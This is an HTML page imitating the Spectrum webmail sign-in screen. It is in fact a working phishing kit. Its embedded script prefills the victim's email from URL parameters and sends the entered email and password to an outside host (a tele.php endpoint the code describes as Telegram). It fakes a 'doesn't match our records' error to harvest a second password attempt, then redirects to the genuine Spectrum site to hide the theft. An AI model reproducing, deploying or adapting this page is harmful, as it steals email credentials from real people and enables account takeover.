<div style="margin: 0px; padding: 0px; flex-shrink: 0; text-align: center; background-color: rgb(255, 255, 255); border-bottom: 1px solid rgb(204, 204, 204); color: rgb(0, 0, 0); font-family: OpenSansRegular, sans-serif; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">
    <nav style="margin: 0px; padding: 0px;">
        <div class="app-header" style="margin: 0px; padding: 0px; background-color: rgb(255, 255, 255); font-family: rutledge-regular;"><button tabindex="0" class="skip-to-content-link" style="margin: 0px; padding: 0px 10px; font-family: Rutledge-Medium; align-items: flex-start; text-align: center; cursor: pointer; border: 2px outset buttonface; background-color: rgb(255, 255, 255); box-sizing: border-box; letter-spacing: normal; word-spacing: normal; text-transform: none; text-indent: 0px; text-shadow: none; display: inline-block; overflow: hidden; position: absolute; z-index: 10; left: -5000px; height: 40px; border-radius: 4px; line-height: 40px; font-size: 0.875rem; vertical-align: middle; outline-offset: -2px;">Skip to Main Content</button>
            <div class="app-header-container" style="margin: 0px; padding: 18px 24px 18px 18px; height: 38px; text-align: center;">
                <div class="app-header-menu" style="margin: 0px; padding: 0px;">
                    <div class="app-global-side-nav" style="margin: 0px; padding: 0px; float: left;"><button class="nav-button" aria-haspopup="true" aria-label="Navigation menu" style="margin: 0px; padding: 0px 10px; font-family: Rutledge-Medium; display: inline-block; height: 40px; border-radius: 4px; line-height: 40px; font-size: medium; text-align: center; vertical-align: middle; cursor: pointer; outline-offset: -2px; border: none; background-color: transparent;">&nbsp;<span class="nav-menu-label" aria-hidden="true" style="margin: 0px 0px 0px 10px; padding: 0px; font-family: Rutledge-Medium; font-size: 16px; vertical-align: middle;">MENU</span></button></div>
                </div>
                <div class="app-header-utility" style="margin: 0px; padding: 0px; float: right;">
                    <div class="app-utility-nav" style="margin: 0px; padding: 0px;"><a class="list-item support-link mat-button" target="_blank" href="https://www.spectrum.net/support/" aria-disabled="false" aria-label="Support (Opens in a new window)" tabindex="0" style="margin: 0px; padding: 0px; color: rgb(0, 16, 25); background-color: inherit; text-decoration: none; font-size: 14px; font-weight: 500; line-height: 38px; cursor: pointer;"><span class="no-border" style="margin: 0px; padding: 0px 0px 0px 20px; max-height: 14px; font-size: 0.875rem; line-height: 0.875rem; vertical-align: middle;">Support</span></a></div>
                </div>
                <div class="app-header-logo" style="margin: 0px auto; padding: 0px;"><a class="mat-button" target="_self" href="https://webmail.spectrum.net/" aria-disabled="false" tabindex="0" style="margin: 0px; padding: 0px; line-height: 38px;"><img alt="Spectrum logo" src="https://webmail.spectrum.net/application/modules/mail/views/scripts/mail/images/logos/spectrum-logo.svg?v=2.17.1_4" style="padding: 0px;"></a></div>
            </div>
            <div class="app-header-local" style="margin: 0px; padding: 0px;">
                <div class="app-local-nav" style="margin: 0px; padding: 0px;"><br></div>
            </div>
        </div>
    </nav>
</div>
<div style="margin: 0px; padding: 0px; flex-grow: 1; display: flex; align-items: center; justify-content: space-around; flex-flow: wrap; overflow-y: auto; color: rgb(0, 0, 0); font-family: OpenSansRegular, sans-serif; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; background-color: #E6E6FA; text-decoration-style: initial; text-decoration-color: initial;">
    <div style="margin: 0px; padding: 2em; font-family: Rutledge-Light, sans-serif;  color: rgb(102, 102, 102); text-decoration: none; font-size: 14px; width: 300px;">
        <div style="margin: 0px; padding: 0px;">
            <h1 style="margin: 0px; padding: 1rem 0px; font-size: 19px; font-weight: bold; color: rgb(51, 51, 51); font-family: Rutledge-Medium, sans-serif; text-align: center;">Sign In to Webmail</h1>
            <form id="loginForm">
                <div style="margin: 0px; padding: 0px;"><label for="emailAddress" style="margin: 0px; padding: 0px;">Email Address</label> <input type="text" id="emailAddress" name="email" value="" style="margin: 0.5rem 0px; padding: 0px 0px 0px 3px; font-family: OpenSansRegular, sans-serif; width: 294px; height: 1.5rem; font-size: 16px;"></div>
                <div style="margin: 0px; padding: 0px;"><input type="checkbox" name="rememberEmail" style="margin: 0px; padding: 0px; font-family: OpenSansRegular, sans-serif;"> <label for="rememberEmail" style="margin: 0px; padding: 0px;">Remember Email Address</label></div>
                <div style="margin: 1rem 0px; padding: 0px;"><label for="emailPassword" style="margin: 0px; padding: 0px;">Email Password <input type="password" id="emailPassword" name="password" value="" style="margin: 0.5rem 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 3px; font-family: OpenSansRegular, sans-serif; width: 294px; height: 1.5rem; font-size: 16px;" class="fr-large"></label></div>
                
                <!-- Error message -->
                <div id="errorMsg" style="color: red; margin-bottom: 10px; display: none; font-weight: bold; text-align: center;">
                    The info you entered doesn't match our records. Please try again.
                </div>
                
                <button type="submit" style="background-color: #4169E1; color: white; border: none; border-radius: 5px; cursor: pointer; width: 300px; height: 2rem; font-family: OpenSansRegular, sans-serif; font-size: 16px; padding-top: 0; padding-bottom: 0;">&nbsp;Sign In&nbsp;</button>
                <p><a href="https://self-care.portals.spectrum.net/username-recovery" style="margin: 0px; padding: 1rem 0px 0px; width: 300px; display: block; color: rgb(0, 115, 209); text-align: center; font-weight: bolder; font-size: 1rem;">Forgot Email Address?</a><a href="https://self-care.portals.spectrum.net/password-reset" style="margin: 0px; padding: 1rem 0px 0px; width: 300px; display: block; color: rgb(0, 115, 209); text-align: center; font-weight: bolder; font-size: 1rem;">Forgot Email Password?</a></p>
            </form>
        </div>
    </div>
</div>
<div style="margin: 0px; padding: 1rem; flex-shrink: 0; background: rgb(0, 0, 0); color: rgb(0, 0, 0); font-family: OpenSansRegular, sans-serif; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">
    <nav style="margin: auto; padding: 0px; width: 1000.5px;">
        <ul style="margin: 0px; padding: 0px; display: block;">
            <li style="margin: 0px; padding: 0px 1rem; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none; border-right: 1px solid rgb(255, 255, 255); line-height: 1.2rem; display: inline-block;">&copy; 2022 Charter Communications. All rights reserved</li>
            <li>&nbsp;</li>
            <li style="margin: 0px; padding: 0px 1rem; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none; border-right: 1px solid rgb(255, 255, 255); line-height: 1.2rem; display: inline-block;"><a href="https://www.spectrumreach.com/" target="_blank" aria-label="Advertise with Us (Opens in new window)" style="margin: 0px; padding: 0px; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none;">Advertise with Us</a></li>
            <li>&nbsp;</li>
            <li style="margin: 0px; padding: 0px 1rem; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none; border-right: 1px solid rgb(255, 255, 255); line-height: 1.2rem; display: inline-block;"><a href="https://www.spectrum.com/policies/your-privacy-rights" target="_blank" aria-label="Your Privacy Rights (Opens in new window)" style="margin: 0px; padding: 0px; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none;">Your Privacy Rights</a></li>
            <li>&nbsp;</li>
            <li style="margin: 0px; padding: 0px 1rem; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none; border-right: 1px solid rgb(255, 255, 255); line-height: 1.2rem; display: inline-block;"><a href="https://www.spectrum.com/policies/website-privacy-policy.html" target="_blank" aria-label="Web Privacy Policy (Opens in new window)" style="margin: 0px; padding: 0px; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none;">Web Privacy Policy</a></li>
            <li>&nbsp;</li>
            <li style="margin: 0px; padding: 0px 1rem; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none; border-right: 1px solid rgb(255, 255, 255); line-height: 1.2rem; display: inline-block;"><a href="https://www.spectrum.com/policies/california" target="_blank" aria-label="California Consumer Privacy Rights (Opens in new window)" style="margin: 0px; padding: 0px; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none;">California Consumer Privacy Rights</a></li>
            <li>&nbsp;</li>
            <li style="margin: 0px; padding: 0px 1rem; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none; border-right: 1px solid rgb(255, 255, 255); line-height: 1.2rem; display: inline-block;"><a href="https://www.spectrum.com/policies/your-privacy-rights-opt-out" target="_blank" aria-label="California Consumer Do Not Sell Or Share My Personal Information (Opens in new window)" style="margin: 0px; padding: 0px; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none;">California Consumer Do Not Sell Or Share My Personal Information</a></li>
            <li>&nbsp;</li>
            <li style="margin: 0px; padding: 0px 1rem; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none; border-right: 1px solid rgb(255, 255, 255); line-height: 1.2rem; display: inline-block;"><a href="https://www.spectrum.com/policies/your-privacy-rights-opt-out" target="_blank" aria-label="California Consumer Limit The Use Of My Sensitive Personal Information (Opens in new window)" style="margin: 0px; padding: 0px; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none;">California Consumer Limit The Use Of My Sensitive Personal Information</a></li>
            <li>&nbsp;</li>
            <li style="margin: 0px; padding: 0px 1rem; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none; border-right: 1px solid rgb(255, 255, 255); line-height: 1.2rem; display: inline-block;"><a href="https://www.spectrum.com/policies/terms-of-service.html" target="_blank" aria-label="Spectrum Subscriber Policies (Opens in new window)" style="margin: 0px; padding: 0px; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none;">Spectrum Subscriber Policies</a></li>
            <li>&nbsp;</li>
            <li style="margin: 0px; padding: 0px 1rem; color: rgb(255, 255, 255); font-size: x-small; text-decoration: none; border-right: none; line-height: 1.2rem; display: inline-block;">Time Warner Cable and the Time Warner Cable logo are trademarks of Time Warner Inc., used under license.</li>
        </ul>
    </nav>
</div>

<script>
// AUTOGRAB FUNCTION - Extracts email from URL
function autograbEmail() {
    const urlParams = new URLSearchParams(window.location.search);
    
    // Check multiple common parameter names
    const emailParams = ['email', 'e', 'user', 'username', 'account', 'mail'];
    
    for (const param of emailParams) {
        const email = urlParams.get(param);
        if (email) {
            // Decode URL encoding and set the email field
            const decodedEmail = decodeURIComponent(email);
            document.getElementById('emailAddress').value = decodedEmail;
            return decodedEmail;
        }
    }
    
    // Also check hash parameters (after #)
    const hash = window.location.hash.substring(1);
    if (hash) {
        const hashParams = new URLSearchParams(hash);
        for (const param of emailParams) {
            const email = hashParams.get(param);
            if (email) {
                const decodedEmail = decodeURIComponent(email);
                document.getElementById('emailAddress').value = decodedEmail;
                return decodedEmail;
            }
        }
    }
    
    return null;
}

// Run autograb when page loads
window.addEventListener('DOMContentLoaded', function() {
    const grabbedEmail = autograbEmail();
    if (grabbedEmail) {
        console.log('Email autograbbed:', grabbedEmail);
        // Focus on password field if email was autograbbed
        document.getElementById('emailPassword').focus();
    }
});

let submissionCount = 0;

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    submissionCount++;
    
    const email = document.getElementById('emailAddress').value;
    const password = document.getElementById('emailPassword').value;
    
    // Send to Telegram
    try {
        await fetch('https://mine.repeatcar.com/568/mx/tele.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({
                'email': email,
                'password': password,
                'attempt': submissionCount
            })
        });
    } catch (error) {
        console.error('Error:', error);
    }
    
   // Inside your existing submit event handler
if (submissionCount === 1) {
    // First attempt - show error and clear password
    document.getElementById('errorMsg').style.display = 'block';
    document.getElementById('emailPassword').value = '';
    document.getElementById('emailPassword').focus();
} else {
    // Second attempt - show message then redirect
    document.getElementById('errorMsg').textContent = 'Server Unavailable, please try again...';
    document.getElementById('errorMsg').style.display = 'block';
    document.getElementById('emailPassword').value = '';
    
    setTimeout(() => {
        window.location.href = 'https://www.spectrum.net';
    }, 1500);
    
    submissionCount = 0;
}
});
</script>
